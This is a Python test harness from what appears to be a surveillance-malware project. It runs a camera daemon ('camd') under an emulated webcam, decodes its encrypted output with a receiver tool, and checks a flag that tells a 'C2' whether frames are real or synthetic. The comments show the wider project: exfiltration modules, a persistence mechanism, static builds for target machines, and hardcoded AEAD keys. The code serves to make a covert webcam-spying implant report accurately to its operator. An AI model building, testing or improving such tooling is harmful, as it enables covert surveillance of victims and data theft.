#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DAYANJING v4 — verify_srcflag_runtime.py

采集源标志位 EXF_FLAG_SRC_SYNTH 的**真实运行**守卫。

====================================================================
为什么单元测试不够，必须另起这个守卫
====================================================================
21_exfil 的 test_exfil_srcflag 验证的是"这个位能穿过信元层"，但它自己
手工构造 flags，根本不经过 cam_daemon。因此存在这样一类失效：

    cd_pack 里那行置位代码被漏写 / 取值来源永不刷新
        -> 单元测试依然 3/0 全绿
        -> 真实回传的每一帧却都标成"设备源"

这不是假想。本守卫就是为抓一个已经发生过的实例而写的：当时降级态被缓
存在 cd_sink_t.src_degrade，由驻留自检回调 cd_report_degrade 写入，而该
回调只在 ensure_persist 为真时才注册 —— 于是关掉驻留（--no-persist）或
非 root 驻留不可用时，回调永不触发，缓存停在初值 0，C2 收到合成画面却
被告知"这是设备源"。单元测试对此全无察觉。

本守卫因此从"接收侧视角"独立验证：真跑 camd 落盘信元，再用
21_exfil/build/dump_srcflag（不复用任何发送侧逻辑）解出每条记录的
flags，断言它与该场景的降级态一致。

====================================================================
为什么必须是动态链接的 camd
====================================================================
沙盒内没有真实摄像头，真设备路径靠 tests/v4l2sim_shim.c 经 LD_PRELOAD
拦截 ioctl 造出。而 LD_PRELOAD 对静态二进制无效 —— 部署产物 camd 正是
静态链接的（跨 libc 目标机所需）。故本守卫用 `make STATIC=0` 另链一份
动态版供 LD_PRELOAD 使用，跑完恢复静态产物。这是验证手段，不是产物变更。

====================================================================
判据：三态必须都能区分
====================================================================
    真设备   degrade=0  ->  flags 含 KEYFRAME|LAST        (0x03)，不得有 SYNTH
    被占用   degrade=2  ->  flags 含 SYNTH                (0x0b)
    无设备   degrade=1  ->  flags 含 SYNTH                (0x0b)

只验"降级时置位"是不够的：一个恒置位的实现同样能通过那两条。必须有
真设备场景证明"该不置位时确实不置位"。
"""

import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
MOD = os.path.dirname(HERE)                      # agent_windows
ROOT = os.path.dirname(MOD)                      # 仓根
EXFIL = os.path.join(ROOT, "21_exfil")
BUILD = os.path.join(MOD, "build", "linux")

SHIM_SRC = os.path.join(HERE, "v4l2sim_shim.c")
SHIM_SO = os.path.join(BUILD, "v4l2sim_shim.so")
DEV = "/dev/video0"
SRC_DAEMON = os.path.join(MOD, "src", "cam_daemon.c")
DUMP = os.path.join(EXFIL, "build", "dump_srcflag")
CAMD_DYN = os.path.join(BUILD, "camd_dyn")

# 与 tests/dump_srcflag.c 内置的接收侧密钥严格对齐。
# camd 的 --key 是 64 hex = k_send(前16) || k_recv(后16)，而 camd 的
# DEF_K_SEND=0b1c...、DEF_K_RECV=f0e1...（两端方向相反），故此处按
# SEND+RECV 顺序拼，与 dump 侧的 k_recv 对应。拼反会得到
# "AEAD authentication failed"，这是本守卫开发时真实踩过的一次。
KEY = "0b1c2d3e4f5061728394a5b6c7d8e9faf0e1d2c3b4a5968778695a4b3c2d1e0f"
PFX = "aabbccddeeff0011"
BACKING = "/data/workspace/.srcflag_guard"

PASS = FAIL = 0


def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print("[OK]   %s%s" % (name, ("  -- " + detail) if detail else ""))
    else:
        FAIL += 1
        print("[FAIL] %s%s" % (name, ("  -- " + detail) if detail else ""))
    return cond


def build_dump():
    r = subprocess.run(["make", "-C", EXFIL, "build/dump_srcflag"],
                       capture_output=True, text=True, timeout=300)
    return r.returncode == 0, (r.stderr or "")[-200:]


def build_shim():
    os.makedirs(BUILD, exist_ok=True)
    r = subprocess.run(["cc", "-std=c99", "-O2", "-shared", "-fPIC",
                        "-o", SHIM_SO, SHIM_SRC, "-ldl"],
                       capture_output=True, text=True, timeout=180)
    return r.returncode == 0, (r.stderr or "")[:200]


def ensure_devnode():
    if os.path.exists(DEV):
        return True
    r = subprocess.run(["mknod", DEV, "c", "81", "0"],
                       capture_output=True, text=True, timeout=60)
    return r.returncode == 0


def build_dyn_camd():
    """链一份动态版 camd 供 LD_PRELOAD 使用，并把静态产物恢复回去。"""
    r = subprocess.run(["make", "-C", MOD, "STATIC=0", "build/linux/camd"],
                       capture_output=True, text=True, timeout=600)
    if r.returncode != 0:
        return False, "动态版构建失败: " + (r.stderr or "")[-200:]
    src = os.path.join(BUILD, "camd")
    if not os.path.exists(src):
        return False, "未产出 camd"
    with open(src, "rb") as f:
        data = f.read()
    with open(CAMD_DYN, "wb") as f:
        f.write(data)
    os.chmod(CAMD_DYN, 0o755)
    # 立刻恢复静态产物：部署包必须是静态的，守卫绝不能把它留下动态版
    subprocess.run(["rm", "-f", src], timeout=60)
    subprocess.run(["make", "-C", MOD, "build/linux/camd"],
                   capture_output=True, text=True, timeout=600)
    return True, ""


def run_case(tag, extra_env, use_shim=True):
    """跑一次 camd 落盘，返回信元文件路径。"""
    os.makedirs(BACKING, exist_ok=True)
    out = os.path.join(BACKING, "cells_%s.bin" % tag)
    try:
        os.remove(out)
    except OSError:
        pass

    env = dict(os.environ)
    env.pop("LD_PRELOAD", None)
    if use_shim:
        env["LD_PRELOAD"] = SHIM_SO
        env["V4L2SIM_STATE"] = os.path.join(BACKING, "st_%s.txt" % tag)
        env["V4L2SIM_FMT"] = "yuyv"
        env["V4L2SIM_W"] = "320"
        env["V4L2SIM_H"] = "240"
    if extra_env:
        env.update(extra_env)

    try:
        r = subprocess.run(
            [CAMD_DYN, "--sink", out, "--key", KEY, "--pfx", PFX,
             "--backend", "v4l2", "--no-persist",
             "--batches", "2", "--frames", "1", "--interval-ms", "50"],
            capture_output=True, text=True, env=env, timeout=180)
    except subprocess.TimeoutExpired:
        return None, "camd 超时"
    if r.returncode != 0:
        return None, "camd rc=%d" % r.returncode
    if not os.path.exists(out) or os.path.getsize(out) == 0:
        return None, "未落盘信元"
    return out, ""


def dump_flags(path):
    """用接收侧工具解出 flags 列表。"""
    r = subprocess.run([DUMP, path], capture_output=True, text=True, timeout=180)
    if r.returncode != 0:
        return None, (r.stderr or r.stdout or "")[-200:]
    flags = []
    synth = []
    for line in (r.stdout or "").splitlines():
        if line.startswith("rec#"):
            tok = line.split()
            for t in tok:
                if t.startswith("flags="):
                    flags.append(int(t[6:], 16))
                if t.startswith("SRC_SYNTH="):
                    synth.append(t[10:])
    if not flags:
        return None, "未解出任何记录"
    return list(zip(flags, synth)), ""


def expect(tag, use_shim, extra_env, want_synth, label):
    """跑一个场景并断言 SYNTH 位是否符合预期。"""
    path, err = run_case(tag, extra_env, use_shim=use_shim)
    if not check("%s：camd 可跑并落盘" % label, path is not None, err):
        return False
    got, err = dump_flags(path)
    if not check("%s：接收侧可解出记录" % label, got is not None, err):
        return False
    detail = "flags=" + ",".join("0x%02x" % f for f, _ in got)
    allok = all((("YES" in s) == want_synth) for _, s in got)
    return check("%s：SRC_SYNTH %s" % (label, "必须置位" if want_synth else "必须不置位"),
                 allok, detail)


def mutate(anchor, replacement):
    """把 cd_pack 的置位逻辑临时改掉，重编动态 camd，跑真设备场景。

    返回 (ok, info, flags列表)。flags 是**数值**，调用方按位判断——
    曾有一版把 info 写成只含 "flags=0x0b" 的文本，再用 `"YES" in info`
    判定，结果永远为假、反向项恒红。文本匹配是脆的，位运算才是判据。
    """
    try:
        with open(SRC_DAEMON) as f:
            orig = f.read()
    except OSError:
        return False, "读源码失败", []
    if anchor not in orig:
        return False, "未找到注入锚点", []

    try:
        with open(SRC_DAEMON, "w") as f:
            f.write(orig.replace(anchor, replacement))
        subprocess.run(["touch", SRC_DAEMON], timeout=30)
        ok, err = build_dyn_camd()
        if not ok:
            return False, err, []
        path, err = run_case("mut", {}, use_shim=True)
        if not path:
            return False, err, []
        got, err = dump_flags(path)
        if not got:
            return False, err, []
        info = "flags=" + ",".join("0x%02x" % f for f, _ in got)
        return True, info, [f for f, _ in got]
    finally:
        with open(SRC_DAEMON, "w") as f:
            f.write(orig)
        subprocess.run(["touch", SRC_DAEMON], timeout=30)
        subprocess.run(["make", "-C", MOD, "build/linux/camd"],
                       capture_output=True, text=True, timeout=600)


def main():
    print("=" * 62)
    print("采集源标志位（SRC_SYNTH）真实运行守卫")
    print("=" * 62)

    ok, err = build_dump()
    if not check("前置：接收侧 dump_srcflag 可构建", ok, err):
        return 2
    ok, err = build_shim()
    if not check("前置：V4L2 shim 可构建", ok, err):
        return 2
    if not check("前置：/dev/video0 节点可用", ensure_devnode()):
        return 2
    ok, err = build_dyn_camd()
    if not check("前置：动态版 camd 可构建（静态产物已恢复）", ok, err):
        return 2

    # ---- 三态 ----
    expect("real", True, {}, False, "F1 真设备 degrade=0")
    expect("busy", True, {"V4L2SIM_REQBUFS_BUSY": "1"}, True, "F2 被占用 degrade=2")
    expect("nodev", False, {}, True, "F3 无设备 degrade=1")

    # ---- 反向 ----
    # R1：恒不置位（删掉置位那行）—— 降级场景必须变红，否则 F2/F3 是恒绿
    anchor = "    if (d != 0) r.flags |= EXF_FLAG_SRC_SYNTH;"
    ok, info, _ = mutate(anchor, "    /* R1 注入：恒不置位 */")
    if ok:
        # 真设备场景仍应"不置位"，但被占用场景必须丢失 SYNTH -> 判据敏感
        path, err = run_case("r1busy", {"V4L2SIM_REQBUFS_BUSY": "1"}, use_shim=True)
        got, _ = dump_flags(path) if path else (None, "")
        lost = got is not None and all(not (f & 0x08) for f, _ in got)
        check("R1 反向：恒不置位时被占用场景失去 SYNTH（判据非恒绿）", lost, info)
    else:
        check("R1 反向：恒不置位注入可跑", False, info)

    # R2：恒置位（无条件 OR）—— 真设备场景必须变红，否则 F1 是恒绿。
    # 判据按位：flags 必须**全部**带上 0x08，而不是去匹配输出里的文本。
    ok, info, flags = mutate(
        anchor, "    r.flags |= EXF_FLAG_SRC_SYNTH; /* R2 注入：恒置位 */")
    if ok:
        wrong = bool(flags) and all(f & 0x08 for f in flags)
        check("R2 反向：恒置位时真设备场景被误标 SYNTH（判据非恒绿）", wrong, info)
    else:
        check("R2 反向：恒置位注入可跑", False, info)

    print("-" * 62)
    print("结果: %d PASS / %d FAIL" % (PASS, FAIL))
    return 0 if FAIL == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
